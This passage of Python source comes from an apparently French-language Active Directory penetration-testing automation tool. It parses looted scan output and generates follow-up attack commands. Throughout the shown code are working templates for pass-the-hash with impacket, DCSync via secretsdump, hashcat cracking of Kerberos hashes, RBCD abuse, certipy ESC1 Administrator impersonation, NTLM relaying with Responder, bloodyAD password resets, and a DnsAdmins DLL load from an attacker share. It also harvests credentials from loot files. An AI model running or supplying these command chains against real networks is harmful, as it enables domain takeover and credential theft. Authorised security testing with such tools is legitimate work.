        "WriteProperty": "écrire propriété ciblée → SPN ou shadow creds",
    }
    for _acl_t, _types in list(acl_map.items())[:4]:
        for _at in _types:
            _tech = _ACL_TECHNIQUE.get(_at, "abus ACL")
            add("attack_paths", f"BloodyAD {_at} sur '{_acl_t}' → {_tech}.")
    if any("DnsAdmins" in e for e in ops["target_accounts"]):
        _dns_u = next((e.split(" —")[0] for e in ops["target_accounts"] if "DnsAdmins" in e), "USER")
        add("attack_paths", f"DnsAdmins ({_dns_u}) → dnscmd /config /serverlevelplugindll \\\\ATTACKER\\share\\evil.dll → SYSTEM DNS.")
    if bh_zip:
        add("attack_paths", f"BloodHound ZIP ({bh_zip[0].name}) → importer GUI → Shortest Paths to Domain Admins.")
    elif bh_review_items:
        add("attack_paths", "BloodHound offline a remonté plusieurs signaux, mais les shortest paths multi-sauts nécessitent toujours la GUI/Neo4j.", bh_review_items[0].get("path", ""))
    if loot_hunt_items:
        add("attack_paths", f"Les fichiers lootés montrent des indices sensibles ; commencer par {loot_hunt_items[0].get('path','')}.", loot_hunt_items[0].get("path", ""))

    # ════════════════════════════════════════════════════════════════════════
    # NEXT COMMANDS
    # ════════════════════════════════════════════════════════════════════════
    if admin_hash:
        add_cmd(f"impacket-psexec -hashes ':{admin_hash}' '{dom}/Administrator@{ip}'")
    if pth_hashes:
        _pu, _ph = pth_hashes[0]
        add_cmd(f"impacket-wmiexec -hashes ':{_ph}' '{dom}/{_pu}@{ip}'")
    if winrm_ok and auth_user:
        add_cmd(f"evil-winrm -i '{ip}' -u '{_u()}' -p '{_p()}'")
    if dcsync_f.exists():
        if "ERROR_DS_DRA_BAD_DN" in dcsync_txt:
            add_cmd(f"impacket-secretsdump '{dom}/{_u()}:{_p()}@{dc}' -target-ip '{ip}' -just-dc-ntlm")
            add_cmd(f"impacket-secretsdump '{dom}/{_u()}:{_p()}@{ip}' -use-vss")
        else:
            add_cmd(f"impacket-secretsdump '{dom}/{_u()}:{_p()}@{ip}' -just-dc-ntlm")
    if asrep_hash_count > 0:
        add_cmd(f"hashcat -m 18200 '{out_dir}/kerberos/asrep_hashes.txt' /usr/share/wordlists/rockyou.txt --force -O")
    elif asrep_candidate_users:
        _uarg = " ".join(f"'{uu}'" for uu in asrep_candidate_users[:8])
        add_cmd(f"impacket-GetNPUsers '{dom}/' -dc-ip '{ip}' -no-pass -usersfile <(printf '%s\\n' {_uarg}) -outputfile '{out_dir}/kerberos/asrep_hashes.txt'")
    if tgs_hash_count > 0:
        add_cmd(f"hashcat -m 13100 '{out_dir}/kerberos/tgs_hashes.txt' /usr/share/wordlists/rockyou.txt --force -O")
    elif kerb_candidate_users:
        add_cmd(f"impacket-GetUserSPNs '{dom}/{_u()}:{_p()}' -dc-ip '{ip}' -request -outputfile '{out_dir}/kerberos/tgs_hashes.txt'")
    for _cu, _cspn in constrained_map[:2]:
        _cu_pass = _p() if _cu.lower() == (_u() or "").lower() else f"PASS_{_cu.upper()}"
        add_cmd(f"impacket-getST '{dom}/{_cu}:{_cu_pass}' -dc-ip '{ip}' -spn '{_cspn}' -impersonate Administrator")
    for _uu in unconstrained_users[:1]:
        add_cmd(f"impacket-printerbug '{dom}/{_u()}:{_p()}@{ip}' ATTACKER_IP  # force TGT depuis DC → capturé sur {_uu}")
    if has_rbcd_write:
        add_cmd(f"impacket-addcomputer '{dom}/{_u()}:{_p()}' -dc-ip '{ip}' -computer-name 'FAKECMP$' -computer-pass 'Fake1234!'")
        add_cmd(f"bloodyAD -d '{dom}' -u '{_u()}' -p '{_p()}' --host '{dc}' set object TARGET$ msDS-AllowedToActOnBehalfOfOtherIdentity -v 'FAKECMP$'")
        add_cmd(f"impacket-getST '{dom}/FAKECMP$:Fake1234!' -dc-ip '{ip}' -spn 'cifs/{dc}' -impersonate Administrator")
    if adcs_esc_list and ca_name:
        if "ESC1" in adcs_esc_list:
            add_cmd(f"certipy req -u '{_u()}@{dom}' -p '{_p()}' -dc-ip '{ip}' -target '{ca_target}' -ca '{ca_name}' -template 'User' -upn 'Administrator@{dom}'")
            add_cmd(f"certipy auth -pfx Administrator.pfx -domain '{dom}' -dc-ip '{ip}'")
        else:
            add_cmd(f"certipy find -u '{_u()}@{dom}' -p '{_p()}' -dc-ip '{ip}' -target '{ca_target}' -ns '{ip}' -vulnerable -stdout")
    elif ca_name:
        add_cmd(f"certipy find -u '{_u()}@{dom}' -p '{_p()}' -dc-ip '{ip}' -target '{ca_target}' -ns '{ip}' -vulnerable -stdout")
    if smb_signing_off:
        add_cmd("sudo ntlmrelayx.py -tf targets_smb.txt -smb2support -c 'whoami /all'  # parallèle avec Responder")
        add_cmd("sudo responder -I eth0 -wrf")
    elif coerce_success:
        add_cmd(f"sudo impacket-ntlmrelayx -t ldap://{ip} --delegate-access")
        add_cmd(f"sudo impacket-ntlmrelayx -t ldaps://{ip} --delegate-access")
        add_cmd("sudo responder -I ATTACKER_IFACE -A  # capture NTLMv2 si tu veux valider le flux avant relay")
        if ca_name:
            add_cmd(f"sudo impacket-ntlmrelayx -t 'http://{ca_target}/certsrv/certfnsh.asp' --adcs --template DomainController")
    if acl_map:
        add_cmd(f"bloodyAD -d '{dom}' -u '{_u()}' -p '{_p()}' --host '{dc}' --dc-ip '{ip}' get writable --detail")
        for _acl_t, _types in list(acl_map.items())[:3]:
            if "ForceChangePassword" in _types:
                add_cmd(f"bloodyAD -d '{dom}' -u '{_u()}' -p '{_p()}' --host '{dc}' --dc-ip '{ip}' set passwd '{_acl_t}' 'NewP@ss2025!'")
            if "AddMember" in _types:
                add_cmd(f"bloodyAD -d '{dom}' -u '{_u()}' -p '{_p()}' --host '{dc}' --dc-ip '{ip}' add groupMember '{_acl_t}' '{_u()}'")
            if any(t in _types for t in ("GenericWrite", "GenericAll", "WriteProperty")):
                add_cmd(f"certipy shadow auto -u '{_u()}@{dom}' -p '{_p()}' -dc-ip '{ip}' -target '{ca_target}' -account '{_acl_t}'")
            if any(t in _types for t in ("WriteDacl", "WriteOwner", "GenericAll")):
                add_cmd(f"bloodyAD -d '{dom}' -u '{_u()}' -p '{_p()}' --host '{dc}' --dc-ip '{ip}' set owner '{_acl_t}' '{_u()}'")
    if machine_account_quota == 0:
        add_cmd(f"# MAQ=0 : utiliser un compte machine existant compromis pour RBCD au lieu de addComputer")
    if domain_trusts:
        for _trust in domain_trusts[:2]:
            add_cmd(f"bloodyAD -d '{_trust}' -u '{_u()}' -p '{_p()}' --host '{_trust}' get writable  # trust {_trust}")
    if bh_zip:
        add_cmd(f"# Importer {bh_zip[0].name} dans BloodHound GUI → Node: Domain → Shortest Paths to DA")
    elif bloodhound_gc_issue:
        add_cmd(f"bloodhound-python -u '{_u()}@{dom}' -p '{_p()}' --auth-method ntlm -d '{dom}' -c Trusts,Container -ns '{ip}' -dc '{dc}' --dns-tcp --disable-autogc --zip -op 'bh_{output_key(dom)}_gcmin'")
    else:
        add_cmd(f"bloodhound-python -u '{_u()}@{dom}' -p '{_p()}' -d '{dom}' -c All -ns '{ip}' -dc '{dc}' --dns-tcp --zip -op 'bh_{output_key(dom)}'")
    if ntp_skew_warn:
        add_cmd(f"sudo ntpdate -u '{ip}'  # corriger décalage horloge avant Kerberos")

    for k in ops:
        ops[k] = ops[k][:12]
    return ops
def detect_loot_contexts(out_dir: Path, summary: dict) -> list[str]:
    contexts: set[str] = set()

    if (out_dir / "nmapresult.txt").exists() or (out_dir / "hosts_discovery").exists():
        contexts.add("network")

    if any([
        (out_dir / "ldapdomaindump").exists(),
        (out_dir / "bloodhound").exists(),
        (out_dir / "kerberos").exists(),
        (out_dir / "bloodyad").exists(),
        (out_dir / "gpo").exists(),
        (out_dir / "adcs").exists(),
        summary.get("users", 0) > 0,
        summary.get("groups", 0) > 0,
        bool(summary.get("adcs_esc")),
    ]):
        contexts.add("ad")
        contexts.add("windows")

    if any([
        (out_dir / "winrm_enum").exists(),
        (out_dir / "mssql_enum").exists(),
        (out_dir / "smb_shares").exists(),
        (out_dir / "dns_enum").exists(),
        summary.get("winrm", "inconnu") != "inconnu",
        summary.get("smb_signing", "inconnu") != "inconnu",
    ]):
        contexts.add("windows")

    if any([
        (out_dir / "web_enum").exists(),
        any(out_dir.glob("web_*")),
        any((out_dir / "attack_checks").glob("tls*")) if (out_dir / "attack_checks").exists() else False,
        any((out_dir / "attack_checks").glob("web_*")) if (out_dir / "attack_checks").exists() else False,
    ]):
        contexts.add("web")

    if any([
        any((out_dir / "attack_checks").glob("ssh_*")) if (out_dir / "attack_checks").exists() else False,
        any((out_dir / "attack_checks").glob("nfs_*")) if (out_dir / "attack_checks").exists() else False,
        any((out_dir / "attack_checks").glob("linux_*")) if (out_dir / "attack_checks").exists() else False,
    ]):
        contexts.add("linux")

    if not contexts:
        contexts.add("loot")

    ordered = ["ad", "windows", "linux", "web", "network", "loot"]
    return [ctx for ctx in ordered if ctx in contexts]


def build_results_layout(summary: dict, contexts: list[str]) -> dict:
    def has_ops() -> bool:
        ops = summary.get("operational", {}) or {}
        return any(bool(ops.get(k)) for k in ("priorities", "target_accounts", "attack_paths", "next_commands"))

    cats = summary.get("categories", {}) or {}
    any_cat = any((cat.get("count") or 0) > 0 for cat in cats.values())
    is_ad = "ad" in contexts
    is_windows = "windows" in contexts

    return {
        "contexts": contexts,
        "sections": {
            "stats": True,
            "categories": any_cat,
            "interesting": bool(summary.get("interesting")),
            "anomalies": bool(summary.get("anomalies")),
            "users": bool(summary.get("user_profiles")) or (summary.get("users", 0) > 0),
            "groups": bool(summary.get("group_profiles")) or (summary.get("groups", 0) > 0),
            "operational": has_ops(),
            "machines": bool(summary.get("machines")),
            "details": bool(summary.get("detail_sections")),
        },
        "stats": {
            "users": is_ad or summary.get("users", 0) > 0,
            "groups": is_ad or summary.get("groups", 0) > 0,
            "asrep": is_ad or summary.get("asrep_hashes", 0) > 0,
            "kerb": is_ad or summary.get("kerberoast_hashes", 0) > 0,
            "ntlm": is_ad or summary.get("ntlm_hashes", 0) > 0,
            "signing": is_windows or summary.get("smb_signing", "inconnu") != "inconnu",
            "winrm": is_windows or summary.get("winrm", "inconnu") != "inconnu",
            "adcs": is_ad or bool(summary.get("adcs_esc")),
            "session": True,
        },
    }


def _detect_new_creds(out_dir: Path, current_cfg: dict) -> dict | None:
    """Scan loot files for valid credentials that differ from current config."""
    cur_user = (current_cfg.get("user") or "").strip().lower()
    cur_pass = (current_cfg.get("password") or "").strip()
    cur_hash = (current_cfg.get("nt_hash") or "").strip().lower()
    cur_ccache = Path((current_cfg.get("ccache") or "").strip()).name.lower()
    sources = [
        (out_dir / "attack_checks" / "smb_auth_test.txt",  r"\[\+\]\s+\S+\\([^:\s]+):(.+)"),
        (out_dir / "attack_checks" / "winrm_auth_test.txt", r"\[\+\]\s+\S+\\([^:\s]+):(.+)"),
        (out_dir / "attack_checks" / "smb_auth_test.txt",  r"\[\+\]\s+([^:\s@]+)@[^:]+:(.+)"),
    ]
    for fpath, pattern in sources:
        if not fpath.exists():
            continue
        txt = safe_read_text(fpath, 8000)
        for m in re.finditer(pattern, txt):
            found_user = m.group(1).strip()
            found_pass = m.group(2).strip()
            if not found_user or not found_pass:
                continue
            if found_user.lower() == cur_user and found_pass == cur_pass:
                continue  # already known
            source_label = fpath.name.replace("_auth_test.txt","").upper()
            return {"user": found_user, "pass": found_pass, "source": source_label}
    for ccache_path in sorted((out_dir / "attack_checks").glob("*.ccache"), key=lambda p: p.stat().st_mtime, reverse=True):
        if ccache_path.name.lower() == cur_ccache:
            continue
        user_guess = ccache_path.stem.split("@", 1)[0].split(".", 1)[0] or current_cfg.get("user") or ""
        return {"user": user_guess, "ccache": str(ccache_path), "source": "CCACHE"}
    # check NXC output for hash
    nxc_files = list(out_dir.rglob("nxc_*.txt"))[:3]
    for fpath in nxc_files:
        txt = safe_read_text(fpath, 8000)
        for m in re.finditer(r"\[\+\]\s+\S+\\([^:\s]+)\s+([0-9a-f]{32}:[0-9a-f]{32})", txt, re.IGNORECASE):
            found_user = m.group(1).strip()
            found_hash = m.group(2).strip()
            if found_user.lower() == cur_user and found_hash.lower() == cur_hash:
                continue  # already known
            return {"user": found_user, "hash": found_hash, "source": "NXC"}
    return None



def _parse_ntp_offset(text: str) -> float | None:
    """Parse offset seconds from ntpdate/ntpdig/chrony output.

    Handles:
      • classic ntpdate : server X, stratum N, offset +NNN.NNN, delay ...
      • ntpdig/chrony   : 2026-03-30 04:58:19 (+0200) +25200.69 +/- 0.01 ...
      • CLOCK stepped   : CLOCK: time stepped by 25200.39
    """
    # ntpdig / chrony style: ") +25200.69 +/-"
    m = re.search(r"\)\s+([+-][0-9]+\.[0-9]+)\s+\+/-", text)
    if m:
        return float(m.group(1))
    # classic ntpdate style
    m = re.search(r"offset\s+([+-]?[0-9]+\.?[0-9]*)", text, re.IGNORECASE)
    if m:
        return float(m.group(1))
    # CLOCK stepped
    m = re.search(r"CLOCK:\s+time stepped by\s+([+-]?[0-9]+\.[0-9]+)", text)
    if m:
        return float(m.group(1))
    return None


async def query_ntp_offset(target: str, timeout: float = 8) -> tuple[float | None, str]:
    ntpbin = shutil.which("ntpdate") or shutil.which("ntpdate-debian")
    if not ntpbin or not target:
        return None, ""
    try:
        proc = await asyncio.create_subprocess_exec(
            ntpbin, "-q", target,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        text = out.decode("utf-8", errors="replace")
        return _parse_ntp_offset(text), text
    except Exception:
        return None, ""

def build_stat_paths(out_dir: Path, domain: str) -> dict:
    """Construit les chemins loot canoniques pour les cartes de stats.
    Renvoie un dict stat_key → chemin relatif à LOOT_DIR (ou None si absent).
    """
    key = output_key(domain)
    def first_existing(*candidates: str) -> str | None:
        for rel in candidates:
            if (out_dir / rel).exists():
                return f"{key}/{rel}"
        return None

    return {
        "users": first_existing(
            "ldapdomaindump/domain_users.html",
            "ldapdomaindump/domain_users.json",
            "ldap_users_auth.txt",
            "users.txt",
        ),
        "groups": first_existing(
            "ldapdomaindump/domain_groups.html",
            "ldapdomaindump/domain_groups.json",
        ),
        "asrep": first_existing("kerberos/asrep_hashes.txt"),
        "kerb":  first_existing("kerberos/tgs_hashes.txt"),
        "ntlm":  first_existing(
            "attack_checks/secretsdump_dcsync.txt",
            "secretsdump_ntlm.txt",
        ),
        "signing": first_existing("attack_checks/smb_signing_check.txt"),
        "winrm": first_existing(
            "attack_checks/winrm_auth_test.txt",
            "attack_checks/winrm_wsman_5985_headers.txt",
            "attack_checks/winrm_wsman_5986_headers.txt",
        ),
        "adcs": first_existing(
            "adcs/certipy_find.log",
            "adcs/certipy_find.txt",
            "adcs/certipy.json",
        ),
        "klist": first_existing("kerberos/klist.txt"),
        "ccache_dir": f"{key}/attack_checks" if (out_dir / "attack_checks").exists() else None,
    }


def summarize_domain_results(domain: str) -> dict:
    out_dir = get_output_dir(domain)
    summary = {
        "domain": domain,
        "users": 0,
        "groups": 0,
        "asrep_hashes": 0,
        "kerberoast_hashes": 0,
        "ntlm_hashes": 0,
        "smb_signing": "inconnu",
        "winrm": "inconnu",
        "adcs_esc": [],
        "auth_mode": "—",
        "interesting": [],
        "anomalies": [],
        "anomaly_stats": {},
        "bloodhound_review": [],
        "loot_hunt": [],
        "parsed_count": 0,
        "categories": {},
        "machines": [],
        "user_profiles": [],
        "group_profiles": [],
        "detail_sections": [],
        "operational": {},
        "contexts": [],
        "layout": {"contexts": [], "sections": {}, "stats": {}},
        "loot_analysis": {},
        "loot_intel": {"credentials": [], "hosts": [], "findings": []},
    }
    if not out_dir.exists():
        return summary

    parsed_dir = out_dir / "parsed"
    parsed_files = sorted(parsed_dir.glob("*.json")) if parsed_dir.exists() else []
    summary["parsed_count"] = len(parsed_files)
    loot_analysis_fp = parsed_dir / "loot_auto_analysis.json"
    if loot_analysis_fp.exists():
        try:
            loot_analysis = json.loads(loot_analysis_fp.read_text())
            summary["loot_analysis"] = {
                "updated_at": loot_analysis.get("updated_at"),
                "source_files": int(loot_analysis.get("source_files", 0) or 0),
                "interesting_files": int(loot_analysis.get("interesting_files", 0) or 0),
                "artifacts": len(loot_analysis.get("artifacts", []) or []),
                "auto_creds_added": int(loot_analysis.get("auto_creds_added", 0) or 0),
            }
            summary["loot_intel"] = loot_analysis.get("loot_intel") or {"credentials": [], "hosts": [], "findings": []}
        except Exception:
            pass

    interesting: list[str] = []
    auth_modes: list[str] = []
    esc_flags: set[str] = set()
    for fp in parsed_files:
        try:
            data = json.loads(fp.read_text())
        except Exception:
            continue
        findings = data.get("findings", {}) or {}
        summary["asrep_hashes"] += int(findings.get("asrep_hashes", 0) or 0)
        summary["kerberoast_hashes"] += int(findings.get("kerberoast_hashes", 0) or 0)
        summary["ntlm_hashes"] += int(findings.get("ntlm_hashes", 0) or 0)
        if findings.get("smb_signing_disabled"):
            summary["smb_signing"] = "désactivé"
        elif findings.get("smb_signing_required") and summary["smb_signing"] == "inconnu":
            summary["smb_signing"] = "requis"
        if findings.get("winrm_open"):
            summary["winrm"] = "ouvert"
        for esc in findings.get("adcs_esc", []) or []:
            esc_flags.add(str(esc))
        auth = data.get("auth_mode")
        if auth and auth != "anonymous":
            auth_modes.append(auth)
        for err in (findings.get("errors", []) or [])[:2]:
            interesting.append(f"{data.get('tool_id','outil')}: {err}")

    summary["adcs_esc"] = sorted(esc_flags)
    if auth_modes:
        summary["auth_mode"] = auth_modes[-1]

    winrm_5985 = out_dir / "attack_checks" / "winrm_wsman_5985_headers.txt"
    winrm_5986 = out_dir / "attack_checks" / "winrm_wsman_5986_headers.txt"
    winrm_auth = out_dir / "attack_checks" / "winrm_auth_test.txt"
    winrm_hint = out_dir / "winrm_enum" / "connection_hint.txt"
    if winrm_auth.exists():
        txt = safe_read_text(winrm_auth, 12000)
        if re.search(r"(\[\+\]|Pwn3d|valid|authenticated|success)", txt, re.IGNORECASE):
            summary["winrm"] = "auth ok"
            interesting.append("WinRM: authentification valide détectée")
        elif summary["winrm"] == "inconnu":
            interesting.append("WinRM: test d'auth présent")
    if summary["winrm"] == "inconnu" and winrm_5985.exists():
        txt = safe_read_text(winrm_5985, 6000)
        if re.search(r"HTTP/1|Server:|WinRM", txt, re.IGNORECASE):
            summary["winrm"] = "ouvert 5985"
            interesting.append("WinRM: WSMan HTTP (5985) répond")
    if summary["winrm"] == "inconnu" and winrm_5986.exists():
        txt = safe_read_text(winrm_5986, 6000)
        if re.search(r"HTTP/1|Server:|WinRM", txt, re.IGNORECASE):
            summary["winrm"] = "ouvert 5986"
            interesting.append("WinRM: WSMan HTTPS (5986) répond")
    if winrm_hint.exists():
        lines = [ln.strip() for ln in safe_read_text(winrm_hint, 8000).splitlines() if ln.strip()]
        if lines and summary["winrm"] == "inconnu":
            summary["winrm"] = "hint dispo"
        if lines:
            interesting.append("WinRM: hint evil-winrm disponible")

    dcsync = out_dir / "attack_checks" / "secretsdump_dcsync.txt"
    if dcsync.exists():
        txt = safe_read_text(dcsync, 8000)
        if "ERROR_DS_DRA_BAD_DN" in txt:
            interesting.append("DCSync: échec DRSUAPI (DN invalide)")
        if re.search(r"\b-use-vss\b", txt, re.IGNORECASE):
            interesting.append("DCSync: retenter avec -use-vss")

    users_file = out_dir / "users.txt"
    users_seen: set[str] = set()
    for rel in ("users.txt", "users_ldap_auth.txt", "users_ldap.txt", "users_rpc.txt", "users_rpc_auth.txt", "users_smb.txt", "users_kerb.txt"):
        fp = out_dir / rel
        if not fp.exists():
            continue
        for ln in safe_read_text(fp).splitlines():
            val = ln.strip()
            if val and not val.startswith("#"):
                users_seen.add(val)
    if users_seen:
        users = sorted(users_seen)
        summary["users"] = len(users)
        interesting.append("Utilisateurs: " + ", ".join(users[:8]) + (" …" if len(users) > 8 else ""))

    ldap_users_auth = out_dir / "ldap_users_auth.txt"
    if ldap_users_auth.exists() and summary["users"] == 0:
        count = len(re.findall(r"^sAMAccountName:\s+", safe_read_text(ldap_users_auth), re.MULTILINE))
        if count:
            summary["users"] = count

    ldap_computers_auth = out_dir / "ldap_computers_auth.txt"
    if ldap_computers_auth.exists():
        hosts = re.findall(r"^dNSHostName:\s+(.+)$", safe_read_text(ldap_computers_auth), re.MULTILINE)
        if hosts:
            interesting.append("Postes LDAP: " + " | ".join(hosts[:6]))

    ldapdump_dir = out_dir / "ldapdomaindump"
    if ldapdump_dir.exists():
        html_files = sorted(ldapdump_dir.glob("*.html"))
        if html_files:
            interesting.append("ldapdomaindump: " + " | ".join(f.name for f in html_files[:4]))
        users_json = ldapdump_dir / "domain_users.json"
        if users_json.exists():
            try:
                users_data = json.loads(users_json.read_text())
                if summary["users"] == 0:
                    summary["users"] = len(users_data)
                sample_users = []
                for entry in users_data[:8]:
                    attrs = entry.get("attributes", {}) or {}
                    sam = (attrs.get("sAMAccountName") or [None])[0]
                    if sam:
                        sample_users.append(str(sam))
                if sample_users:
                    interesting.append("Utilisateurs ldapdomaindump: " + ", ".join(sample_users[:8]))
            except Exception:
                pass

        groups_json = ldapdump_dir / "domain_groups.json"
        if groups_json.exists():
            try:
                groups_data = json.loads(groups_json.read_text())
                if summary["groups"] == 0:
                    summary["groups"] = len(groups_data)
                interesting.append(f"Groupes ldapdomaindump: {len(groups_data)}")
                sample_groups = []
                for entry in groups_data[:6]:
                    attrs = entry.get("attributes", {}) or {}
                    sam = (attrs.get("sAMAccountName") or attrs.get("cn") or [None])[0]
                    if sam:
                        sample_groups.append(str(sam))
                if sample_groups:
                    interesting.append("Exemples groupes: " + " | ".join(sample_groups))
            except Exception:
                pass

        computers_json = ldapdump_dir / "domain_computers.json"
        if computers_json.exists():
            try:
                computers_data = json.loads(computers_json.read_text())
                interesting.append(f"Postes ldapdomaindump: {len(computers_data)}")
                sample_hosts = []
                for entry in computers_data[:6]:
                    attrs = entry.get("attributes", {}) or {}
                    host = (attrs.get("dNSHostName") or attrs.get("cn") or [None])[0]
                    if host:
                        sample_hosts.append(str(host))
                if sample_hosts:
                    interesting.append("Exemples postes: " + " | ".join(sample_hosts))
            except Exception:
                pass

    raw_checks = [
        ("smb_shares/shares_target.txt", "Partages"),
        ("ldap_asrep_candidates.txt", "ASREPRoastable"),
        ("ldap_admincount.txt", "AdminCount=1"),
        ("ldap_pwdneverexpires.txt", "Mots de passe non expirants"),
        ("hosts_discovery/discovered_hosts.txt", "Hôtes découverts"),
        ("gpp_hits.txt", "GPP hits"),
        ("creds_hits.txt", "Credentials hits"),
    ]
    for rel, label in raw_checks:
        fp = out_dir / rel
        if not fp.exists():
            continue
        lines = [ln.strip() for ln in safe_read_text(fp, 5000).splitlines() if ln.strip()]
        if not lines:
            continue
        kept = [ln for ln in lines if not ln.startswith("#")][:4]
        if kept:
            interesting.append(f"{label}: " + " | ".join(kept))

    summary["anomalies"] = normalize_loot_item_paths(out_dir, collect_directory_anomalies(out_dir))
    loot_intel_findings = normalize_loot_item_paths(out_dir, (summary.get("loot_intel") or {}).get("findings") or [])
    summary["anomalies"].extend(loot_intel_findings[:8])
    summary["anomaly_stats"] = {
        sev: sum(1 for item in summary["anomalies"] if item.get("severity") == sev)
        for sev in ("critical", "high", "medium", "low")
    }
    summary["bloodhound_review"] = normalize_loot_item_paths(out_dir, collect_bloodhound_auto_review(out_dir))
    summary["loot_hunt"] = normalize_loot_item_paths(out_dir, collect_looted_file_review(out_dir))
    for item in summary["loot_hunt"][:3]:
        summary["anomalies"].append({
            "title": item.get("title", ""),
            "text": item.get("title", ""),
            "path": item.get("path", ""),
            "severity": item.get("severity", "medium"),
            "why": item.get("why", ""),
            "impact": item.get("impact", ""),
            "evidence": item.get("evidence", ""),
        })
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    summary["anomalies"] = sorted(
        summary["anomalies"],
        key=lambda item: (order.get(item.get("severity", "medium"), 9), item.get("text", ""))
    )[:18]
    summary["anomaly_stats"] = {
        sev: sum(1 for item in summary["anomalies"] if item.get("severity") == sev)
        for sev in ("critical", "high", "medium", "low")
    }
    for item in summary["anomalies"][:5]:
        interesting.append("Faiblesse: " + str(item.get("text", "")))
    for item in summary["bloodhound_review"][:4]:
        interesting.append("BloodHound auto: " + str(item.get("text", "")))
    for item in summary["loot_hunt"][:3]:
        interesting.append("Fichier suspect: " + str(item.get("path", "")))
    for item in ((summary.get("loot_intel") or {}).get("credentials") or [])[:3]:
        cred_text = f"{item.get('user','?')} / {item.get('pass','').strip()[:40]}"
        src = item.get("path", "")
        interesting.append(f"Credential extrait du loot: {cred_text}" + (f" ({src})" if src else ""))
    for item in ((summary.get("loot_intel") or {}).get("hosts") or [])[:3]:
        host = item.get("host") or item.get("ip") or "?"
        src = item.get("path", "")
        interesting.append(f"Hôte interne extrait du loot: {host}" + (f" ({src})" if src else ""))
    if len(interesting) > 20:
        interesting = interesting[:20]
    summary["interesting"] = interesting
    summary["categories"] = categorize_domain_findings(out_dir)
    summary["machines"] = collect_discovered_machines(out_dir)
    summary["user_profiles"] = collect_user_profiles(out_dir)
    summary["group_profiles"] = collect_group_profiles(out_dir)
    if summary["groups"] == 0 and summary["group_profiles"]:
        summary["groups"] = len(summary["group_profiles"])
    detail_sections = normalize_loot_section_paths(out_dir, collect_detail_sections(out_dir))
    if summary["anomalies"]:
        detail_sections.insert(0, {
            "key": "anomalies",
            "title": "Anomalies & faiblesses",
            "items": summary["anomalies"][:10],
        })
    if summary["bloodhound_review"]:
        detail_sections.insert(1 if summary["anomalies"] else 0, {
            "key": "bloodhound_auto",
            "title": "BloodHound auto-review",
            "items": summary["bloodhound_review"][:10],
        })
    if summary["loot_hunt"]:
        insert_at = 2 if summary["anomalies"] and summary["bloodhound_review"] else (1 if (summary["anomalies"] or summary["bloodhound_review"]) else 0)
        detail_sections.insert(insert_at, {
            "key": "loot_hunt",
            "title": "Fichiers lootés suspects",
            "items": summary["loot_hunt"][:10],
        })
    loot_intel_items: list[dict] = []
    for cred in ((summary.get("loot_intel") or {}).get("credentials") or [])[:6]:
        path = str(cred.get("path", "") or "")
        loot_intel_items.append({
            "text": f"Credential extrait: {cred.get('user','?')} / {cred.get('pass','').strip()[:60]}",
            "path": path,
        })
    for host in ((summary.get("loot_intel") or {}).get("hosts") or [])[:6]:
        path = str(host.get("path", "") or "")
        target = host.get("host") or host.get("ip") or "?"
        info = str(host.get("info", "") or "").strip()
        loot_intel_items.append({
            "text": f"Hôte extrait: {target}" + (f" [{info}]" if info else ""),
            "path": path,
        })
    if loot_intel_items:
        insert_at = 3 if summary["anomalies"] or summary["bloodhound_review"] or summary["loot_hunt"] else 0
        detail_sections.insert(insert_at, {
            "key": "loot_intel",
            "title": "Intel extrait des logs",
            "items": loot_intel_items[:12],
        })
    summary["detail_sections"] = normalize_loot_section_paths(out_dir, detail_sections)
    summary["operational"] = collect_operational_view(out_dir, domain, summary)
    summary["contexts"] = detect_loot_contexts(out_dir, summary)
    summary["layout"] = build_results_layout(summary, summary["contexts"])
    summary["stat_paths"] = build_stat_paths(out_dir, domain)
    ntp_file = out_dir / "attack_checks" / "ntp_sync.txt"
    if ntp_file.exists():
        ntp_text = safe_read_text(ntp_file, 12000)
        ntp_line = ""
        if re.search(r"(adjust time server|step time server)", ntp_text, re.IGNORECASE):
            ntp_line = "NTP : heure synchronisée"
        elif "nouvelle tentative via l'IP cible" in ntp_text and re.search(r"(offset|server)", ntp_text, re.IGNORECASE):
            ntp_line = "NTP : fallback IP utilisé après échec via le nom du DC"
        elif re.search(r"(offset|server)", ntp_text, re.IGNORECASE):
            ntp_line = "NTP : réponse obtenue"
        elif re.search(r"(no server suitable|Name or service not known|Temporary failure|timed out|no eligible servers)", ntp_text, re.IGNORECASE):
            ntp_line = "NTP : échec de synchronisation/réponse"
        if ntp_line:
            summary["interesting"].insert(0, ntp_line)
            summary["interesting"] = summary["interesting"][:20]
    return summary

def extract_findings(output: str) -> dict:
    esc = sorted({f"ESC{m}" for m in re.findall(r"ESC([0-9]+)", output)})
    errors = []
    for line in output.splitlines():
        if re.search(r"^\[!]|ERROR|FAIL|CRITICAL", line, re.IGNORECASE):
            errors.append(line[:300])
        if len(errors) >= 10:
            break
    return {
        "asrep_hashes": len(re.findall(r"\$krb5asrep\$", output)),
        "kerberoast_hashes": len(re.findall(r"\$krb5tgs\$", output)),
        "ntlm_hashes": len(re.findall(r":[0-9a-f]{32}:[0-9a-f]{32}", output, re.IGNORECASE)),
        "smb_signing_disabled": bool(re.search(r"signing.*(?:false|disabled)", output, re.IGNORECASE)),
        "smb_signing_required": bool(re.search(r"signing.*(?:true|required)", output, re.IGNORECASE)),
        "winrm_open": bool(re.search(r"5985.*open|winrm.*open|WinRM.*OK", output, re.IGNORECASE)),
        "adcs_esc": esc,
        "errors": errors,
    }


def _should_auto_analyze_file(path: Path) -> bool:
    if not path.is_file():
        return False
    if "parsed" in path.parts:
        return False
    suffix = path.suffix.lower()
    if suffix in AUTO_ANALYZE_SKIP_SUFFIXES:
        return False
    if suffix in AUTO_ANALYZE_TEXT_SUFFIXES:
        return True
    return suffix == "" and path.parent.name != "downloads"


def analyze_loot_artifacts(domain: str) -> dict:
    out_dir = get_output_dir(domain)
    analysis = {
        "domain": domain,
        "updated_at": time.time(),
        "source_files": 0,
        "interesting_files": 0,
        "path": "",
    }
    if not out_dir.exists():
        return analysis

    sync_external_loot_artifacts(out_dir)
    parsed_dir = out_dir / "parsed"
    history_dir = parsed_dir / "runs"
    parsed_dir.mkdir(parents=True, exist_ok=True)
    history_dir.mkdir(exist_ok=True)

    aggregate = {
        "asrep_hashes": 0,
        "kerberoast_hashes": 0,
        "ntlm_hashes": 0,
        "smb_signing_disabled": False,
        "smb_signing_required": False,
        "winrm_open": False,
        "adcs_esc": set(),
        "errors": [],
    }
    preview_chunks: list[str] = []
